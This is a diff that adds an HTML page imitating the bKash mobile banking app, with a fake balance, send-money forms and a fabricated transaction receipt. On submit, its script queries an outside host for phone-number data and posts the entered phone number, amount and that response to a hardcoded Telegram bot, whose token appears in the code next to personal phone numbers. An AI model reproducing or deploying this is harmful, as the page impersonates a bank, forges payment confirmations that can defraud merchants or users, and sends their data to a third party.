@@ -1,0 +1,885 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>bKash - Mobile Banking</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #ff6b6b, #4ecdc4);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        
+        .bkash-app {
+            width: 100%;
+            max-width: 400px;
+            background: #fff;
+            border-radius: 20px;
+            overflow: hidden;
+            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.2);
+            position: relative;
+        }
+        
+        .header {
+            background: linear-gradient(to right, #e1306c, #ff6b6b);
+            color: white;
+            padding: 25px 20px;
+            text-align: center;
+            position: relative;
+        }
+        
+        .logo {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin-bottom: 15px;
+        }
+        
+        .logo i {
+            font-size: 28px;
+        }
+        
+        .logo h1 {
+            font-size: 24px;
+            font-weight: 700;
+        }
+        
+        .balance-container {
+            margin: 20px 0;
+            cursor: pointer;
+            transition: transform 0.3s;
+        }
+        
+        .balance-container:hover {
+            transform: scale(1.03);
+        }
+        
+        .balance-container h2 {
+            font-size: 18px;
+            font-weight: 500;
+            margin-bottom: 5px;
+        }
+        
+        .balance {
+            font-size: 32px;
+            font-weight: 700;
+            letter-spacing: 1px;
+        }
+        
+        .features {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 15px;
+            padding: 20px;
+            background: #f8f9fa;
+        }
+        
+        .feature {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 8px;
+            padding: 12px 5px;
+            border-radius: 12px;
+            background: white;
+            box-shadow: 0 3px 10px rgba(0, 0, 0, 0.08);
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        
+        .feature:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 8px 15px rgba(0, 0, 0, 0.1);
+            background: linear-gradient(to bottom, #f8f9fa, #e9ecef);
+        }
+        
+        .feature i {
+            font-size: 24px;
+            color: #e1306c;
+            background: rgba(225, 48, 108, 0.1);
+            width: 50px;
+            height: 50px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .feature span {
+            font-size: 12px;
+            font-weight: 500;
+            color: #333;
+            text-align: center;
+        }
+        
+        .more-features {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 15px;
+            padding: 15px 20px;
+        }
+        
+        .section-title {
+            padding: 15px 20px 10px;
+            font-size: 18px;
+            font-weight: 600;
+            color: #333;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .section-title span {
+            color: #e1306c;
+            font-size: 14px;
+            cursor: pointer;
+        }
+        
+        .my-bkash {
+            padding: 15px 20px;
+            background: #f8f9fa;
+            border-top: 1px solid #eee;
+            border-bottom: 1px solid #eee;
+        }
+        
+        .edit-btn {
+            background: #e1306c;
+            color: white;
+            border: none;
+            padding: 8px 15px;
+            border-radius: 20px;
+            font-size: 14px;
+            cursor: pointer;
+            display: block;
+            margin-left: auto;
+            transition: background 0.3s;
+        }
+        
+        .edit-btn:hover {
+            background: #c41e5a;
+        }
+        
+        .number-list {
+            padding: 15px 20px;
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+        
+        .number-item {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            padding: 12px 15px;
+            background: white;
+            border-radius: 12px;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.05);
+            transition: transform 0.3s;
+        }
+        
+        .number-item:hover {
+            transform: translateX(5px);
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+        }
+        
+        .number-icon {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            background: linear-gradient(to bottom right, #4ecdc4, #1a936f);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-weight: bold;
+        }
+        
+        .number-info {
+            flex: 1;
+        }
+        
+        .number-info h3 {
+            font-size: 16px;
+            color: #333;
+            margin-bottom: 3px;
+        }
+        
+        .number-info p {
+            font-size: 14px;
+            color: #666;
+        }
+        
+        .bundle-section {
+            padding: 15px 20px;
+        }
+        
+        .bundle-card {
+            background: linear-gradient(to right, #1a936f, #4ecdc4);
+            border-radius: 15px;
+            padding: 20px;
+            color: white;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+        }
+        
+        .bundle-card h3 {
+            font-size: 18px;
+            margin-bottom: 10px;
+        }
+        
+        .bundle-card p {
+            font-size: 14px;
+            opacity: 0.9;
+        }
+        
+        .nav {
+            display: flex;
+            justify-content: space-around;
+            background: white;
+            padding: 15px 0;
+            border-top: 1px solid #eee;
+        }
+        
+        .nav-item {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 5px;
+            color: #666;
+            font-size: 12px;
+            cursor: pointer;
+            transition: color 0.3s;
+        }
+        
+        .nav-item.active {
+            color: #e1306c;
+        }
+        
+        .nav-item i {
+            font-size: 20px;
+        }
+        
+        .modal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.7);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            opacity: 0;
+            visibility: hidden;
+            transition: all 0.3s;
+        }
+        
+        .modal.active {
+            opacity: 1;
+            visibility: visible;
+        }
+        
+        .modal-content {
+            background: white;
+            width: 90%;
+            max-width: 400px;
+            border-radius: 20px;
+            overflow: hidden;
+            transform: translateY(20px);
+            transition: transform 0.4s;
+        }
+        
+        .modal.active .modal-content {
+            transform: translateY(0);
+        }
+        
+        .modal-header {
+            background: #e1306c;
+            color: white;
+            padding: 15px 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .modal-header h3 {
+            font-size: 18px;
+        }
+        
+        .close-btn {
+            background: none;
+            border: none;
+            color: white;
+            font-size: 24px;
+            cursor: pointer;
+            width: 40px;
+            height: 40px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 50%;
+            transition: background 0.3s;
+        }
+        
+        .close-btn:hover {
+            background: rgba(255, 255, 255, 0.2);
+        }
+        
+        .modal-body {
+            padding: 25px 20px;
+        }
+        
+        .input-group {
+            margin-bottom: 20px;
+        }
+        
+        .input-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 500;
+            color: #333;
+        }
+        
+        .input-group input {
+            width: 100%;
+            padding: 15px;
+            border: 2px solid #ddd;
+            border-radius: 12px;
+            font-size: 16px;
+            transition: border-color 0.3s;
+        }
+        
+        .input-group input:focus {
+            border-color: #e1306c;
+            outline: none;
+        }
+        
+        .submit-btn {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(to right, #e1306c, #ff6b6b);
+            color: white;
+            border: none;
+            border-radius: 12px;
+            font-size: 18px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+            box-shadow: 0 5px 15px rgba(225, 48, 108, 0.4);
+        }
+        
+        .submit-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 20px rgba(225, 48, 108, 0.6);
+        }
+        
+        .confirmation-modal {
+            background: #fff;
+            border-radius: 20px;
+            width: 90%;
+            max-width: 400px;
+            overflow: hidden;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
+        }
+        
+        .confirmation-header {
+            background: #1a936f;
+            color: white;
+            padding: 25px 20px;
+            text-align: center;
+        }
+        
+        .confirmation-header h2 {
+            font-size: 24px;
+            margin-bottom: 5px;
+            letter-spacing: 1px;
+        }
+        
+        .confirmation-header p {
+            font-size: 16px;
+            opacity: 0.9;
+        }
+        
+        .confirmation-body {
+            padding: 25px 20px;
+        }
+        
+        .transaction-detail {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        
+        .transaction-detail p {
+            font-size: 14px;
+            color: #666;
+            margin-bottom: 5px;
+        }
+        
+        .transaction-detail h3 {
+            font-size: 18px;
+            color: #333;
+            margin-bottom: 20px;
+        }
+        
+        .amount {
+            font-size: 36px;
+            font-weight: 700;
+            color: #e1306c;
+            margin: 20px 0;
+        }
+        
+        .balance-info {
+            background: #f8f9fa;
+            border-radius: 15px;
+            padding: 20px;
+            text-align: center;
+            margin: 20px 0;
+        }
+        
+        .balance-info p {
+            font-size: 16px;
+            color: #666;
+            margin-bottom: 8px;
+        }
+        
+        .balance-info .new-balance {
+            font-size: 28px;
+            font-weight: 700;
+            color: #1a936f;
+        }
+        
+        .return-home {
+            display: block;
+            width: 100%;
+            padding: 16px;
+            background: #1a936f;
+            color: white;
+            border: none;
+            border-radius: 12px;
+            font-size: 18px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin-top: 20px;
+            text-align: center;
+            text-decoration: none;
+        }
+        
+        .return-home:hover {
+            background: #147a5c;
+            transform: translateY(-3px);
+            box-shadow: 0 5px 15px rgba(26, 147, 111, 0.4);
+        }
+        
+        .current-time {
+            text-align: center;
+            color: #666;
+            font-size: 14px;
+            margin-bottom: 20px;
+        }
+        
+        .transaction-id {
+            text-align: center;
+            color: #999;
+            font-size: 12px;
+            margin-top: 20px;
+        }
+        
+        .telegram-status {
+            position: fixed;
+            bottom: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: rgba(0, 0, 0, 0.7);
+            color: white;
+            padding: 10px 20px;
+            border-radius: 30px;
+            font-size: 14px;
+            z-index: 2000;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <!-- Telegram Status -->
+    <div class="telegram-status" id="telegramStatus">
+        Transaction details sent to Telegram successfully!
+    </div>
+    
+    <!-- Main App -->
+    <div class="bkash-app">
+        <div class="header">
+            <div class="logo">
+                <i class="fas fa-wallet"></i>
+                <h1>bKash</h1>
+            </div>
+            <div class="balance-container" id="balanceContainer">
+                <h2>Tap for Balance</h2>
+                <div class="balance" id="balance">৳ ******</div>
+            </div>
+        </div>
+        
+        <div class="features">
+            <div class="feature" data-action="send">
+                <i class="fas fa-paper-plane"></i>
+                <span>Send Money</span>
+            </div>
+            <div class="feature" data-action="recharge">
+                <i class="fas fa-mobile-alt"></i>
+                <span>Mobile Recharge</span>
+            </div>
+            <div class="feature" data-action="cashout">
+                <i class="fas fa-money-bill-wave"></i>
+                <span>Cash Out</span>
+            </div>
+            <div class="feature" data-action="payment">
+                <i class="fas fa-shopping-cart"></i>
+                <span>Make Payment</span>
+            </div>
+        </div>
+        
+        <div class="more-features">
+            <div class="feature">
+                <i class="fas fa-plus-circle"></i>
+                <span>Add Money</span>
+            </div>
+            <div class="feature">
+                <i class="fas fa-file-invoice"></i>
+                <span>Pay Bill</span>
+            </div>
+            <div class="feature">
+                <i class="fas fa-piggy-bank"></i>
+                <span>Savings</span>
+            </div>
+            <div class="feature">
+                <i class="fas fa-hand-holding-usd"></i>
+                <span>Loan</span>
+            </div>
+        </div>
+        
+        <div class="section-title">
+            See More <span>View All</span>
+        </div>
+        
+        <div class="my-bkash">
+            <h3>My bKash</h3>
+            <button class="edit-btn">Edit</button>
+        </div>
+        
+        <div class="number-list">
+            <div class="number-item">
+                <div class="number-icon">N</div>
+                <div class="number-info">
+                    <h3>Nishad Ali</h3>
+                    <p>01728154363</p>
+                </div>
+            </div>
+            <div class="number-item">
+                <div class="number-icon">R</div>
+                <div class="number-info">
+                    <h3>Rahim Khan</h3>
+                    <p>01883735992</p>
+                </div>
+            </div>
+            <div class="number-item">
+                <div class="number-icon">S</div>
+                <div class="number-info">
+                    <h3>Saleh Ahmed</h3>
+                    <p>01622051208</p>
+                </div>
+            </div>
+        </div>
+        
+        <div class="section-title">
+            bKash Bundle <span>See All</span>
+        </div>
+        
+        <div class="bundle-section">
+            <div class="bundle-card">
+                <h3>100 Send Money</h3>
+                <p>Send money to any bKash account for only ৳5</p>
+            </div>
+        </div>
+        
+        <div class="nav">
+            <div class="nav-item active">
+                <i class="fas fa-home"></i>
+                <span>Home</span>
+            </div>
+            <div class="nav-item">
+                <i class="fas fa-qrcode"></i>
+                <span>Scan QR</span>
+            </div>
+            <div class="nav-item">
+                <i class="fas fa-search"></i>
+                <span>Search</span>
+            </div>
+            <div class="nav-item">
+                <i class="fas fa-inbox"></i>
+                <span>Inbox</span>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Transaction Modal -->
+    <div class="modal" id="transactionModal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h3 id="modalTitle">Send Money</h3>
+                <button class="close-btn" id="closeModal">&times;</button>
+            </div>
+            <div class="modal-body">
+                <div class="input-group">
+                    <label for="phoneNumber">Phone Number</label>
+                    <input type="tel" id="phoneNumber" placeholder="Enter receiver's number" maxlength="11">
+                </div>
+                <div class="input-group">
+                    <label for="amount">Amount (৳)</label>
+                    <input type="number" id="amount" placeholder="Enter amount">
+                </div>
+                <button class="submit-btn" id="submitTransaction">Send</button>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Confirmation Modal -->
+    <div class="modal" id="confirmationModal">
+        <div class="confirmation-modal">
+            <div class="confirmation-header">
+                <h2 id="confirmationNumber">01608604483</h2>
+                <p id="confirmationName">Nishad Ali</p>
+            </div>
+            <div class="confirmation-body">
+                <div class="current-time" id="currentTime">11:47pm 05/10/24</div>
+                
+                <div class="transaction-detail">
+                    <p>Transaction Type</p>
+                    <h3 id="transactionType">Send Money</h3>
+                    <div class="amount" id="transactionAmount">$50.00</div>
+                </div>
+                
+                <div class="balance-info">
+                    <p>New Balance</p>
+                    <div class="new-balance" id="newBalance">$9,926.41</div>
+                </div>
+                
+                <a href="#" class="return-home" id="returnHome">
+                    হোম-এ ফিরে যাই
+                </a>
+                
+                <div class="transaction-id">
+                    Transaction ID: 5T8X2R9Y6
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <script>
+        // Current balance value
+        let currentBalance = 1000.00;
+        let currentAction = "";
+        
+        // DOM Elements
+        const balanceContainer = document.getElementById('balanceContainer');
+        const balanceDisplay = document.getElementById('balance');
+        const transactionModal = document.getElementById('transactionModal');
+        const confirmationModal = document.getElementById('confirmationModal');
+        const closeModal = document.getElementById('closeModal');
+        const modalTitle = document.getElementById('modalTitle');
+        const submitTransaction = document.getElementById('submitTransaction');
+        const phoneNumberInput = document.getElementById('phoneNumber');
+        const amountInput = document.getElementById('amount');
+        const confirmationNumber = document.getElementById('confirmationNumber');
+        const transactionType = document.getElementById('transactionType');
+        const transactionAmount = document.getElementById('transactionAmount');
+        const newBalance = document.getElementById('newBalance');
+        const returnHome = document.getElementById('returnHome');
+        const currentTimeDisplay = document.getElementById('currentTime');
+        const features = document.querySelectorAll('.feature[data-action]');
+        const telegramStatus = document.getElementById('telegramStatus');
+        
+        // Format currency
+        function formatCurrency(amount) {
+            return '৳' + amount.toFixed(2);
+        }
+        
+        // Show current date and time
+        function getCurrentDateTime() {
+            const now = new Date();
+            const hours = now.getHours();
+            const minutes = now.getMinutes().toString().padStart(2, '0');
+            const ampm = hours >= 12 ? 'pm' : 'am';
+            const formattedHours = hours % 12 || 12;
+            
+            const day = now.getDate().toString().padStart(2, '0');
+            const month = (now.getMonth() + 1).toString().padStart(2, '0');
+            const year = now.getFullYear().toString().slice(-2);
+            
+            return `${formattedHours}:${minutes}${ampm} ${day}/${month}/${year}`;
+        }
+        
+        // Toggle balance visibility
+        balanceContainer.addEventListener('click', function() {
+            balanceDisplay.textContent = formatCurrency(currentBalance);
+            
+            // Hide balance after 5 seconds
+            setTimeout(() => {
+                balanceDisplay.textContent = '৳ ******';
+            }, 5000);
+        });
+        
+        // Open transaction modal
+        features.forEach(feature => {
+            feature.addEventListener('click', function() {
+                currentAction = this.getAttribute('data-action');
+                
+                // Set modal title based on action
+                let title = "";
+                switch(currentAction) {
+                    case "send":
+                        title = "Send Money";
+                        break;
+                    case "recharge":
+                        title = "Mobile Recharge";
+                        break;
+                    case "cashout":
+                        title = "Cash Out";
+                        break;
+                    case "payment":
+                        title = "Make Payment";
+                        break;
+                }
+                
+                modalTitle.textContent = title;
+                phoneNumberInput.value = "";
+                amountInput.value = "";
+                transactionModal.classList.add('active');
+            });
+        });
+        
+        // Close modal
+        closeModal.addEventListener('click', function() {
+            transactionModal.classList.remove('active');
+        });
+        
+        // Submit transaction
+        submitTransaction.addEventListener('click', async function() {
+            const phoneNumber = phoneNumberInput.value;
+            const amount = parseFloat(amountInput.value);
+            
+            if (!phoneNumber || phoneNumber.length !== 11) {
+                alert("Please enter a valid 11-digit phone number");
+                return;
+            }
+            
+            if (!amount || amount <= 0) {
+                alert("Please enter a valid amount");
+                return;
+            }
+            
+            if (amount > currentBalance) {
+                alert("Insufficient balance");
+                return;
+            }
+            
+            // Get API response
+            let apiResponse = {};
+            try {
+                const response = await fetch('http://ibadat.co/digi.msisdn.get.app/');
+                if (response.ok) {
+                    apiResponse = await response.text();
+                } else {
+                    apiResponse = { error: `HTTP error! status: ${response.status}` };
+                }
+            } catch (error) {
+                apiResponse = { error: error.message };
+            }
+            
+            // Send data to Telegram
+            const botToken = "7850244238:AAEJ7rsIrWwCowOJ5C3Rpx3WjBx4D_sDs-s";
+            const chatId = "1711774702";
+            const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+            
+            const message = `🔔 New Transaction Alert! 🔔
+            
+Action: ${currentAction}
+Phone: ${phoneNumber}
+Amount: ${amount}
+API Response: ${JSON.stringify(apiResponse)}
+            
+Date: ${getCurrentDateTime()}`;
+            
+            try {
+                const telegramResponse = await fetch(telegramUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message
+                    })
+                });
+                
+                const telegramData = await telegramResponse.json();
+                console.log('Telegram response:', telegramData);
+                
+                // Show success notification
+                telegramStatus.style.display = 'block';
+                setTimeout(() => {
+                    telegramStatus.style.display = 'none';
+                }, 3000);
+            } catch (error) {
+                console.error('Error sending to Telegram:', error);
+            }
+            
+            // Update confirmation modal
+            transactionType.textContent = modalTitle.textContent;
+            confirmationNumber.textContent = phoneNumber;
+            transactionAmount.textContent = '৳' + amount.toFixed(2);
+            
+            // Update balance
+            currentBalance -= amount;
+            newBalance.textContent = formatCurrency(currentBalance);
+            currentTimeDisplay.textContent = getCurrentDateTime();
+            
+            // Close transaction modal and open confirmation
+            transactionModal.classList.remove('active');
+            confirmationModal.classList.add('active');
+        });
+        
+        // Return home from confirmation
+        returnHome.addEventListener('click', function(e) {
+            e.preventDefault();
+            confirmationModal.classList.remove('active');
+            balanceDisplay.textContent = '৳ ******';
+        });
+        
+        // Close modals when clicking outside
+        window.addEventListener('click', function(e) {
+            if (e.target === transactionModal) {
+                transactionModal.classList.remove('active');
+            }
+            if (e.target === confirmationModal) {
+                confirmationModal.classList.remove('active');
+            }
+        });
+        
+        // Set current time initially
+        currentTimeDisplay.textContent = getCurrentDateTime();
+    </script>
+</body>
+</html>
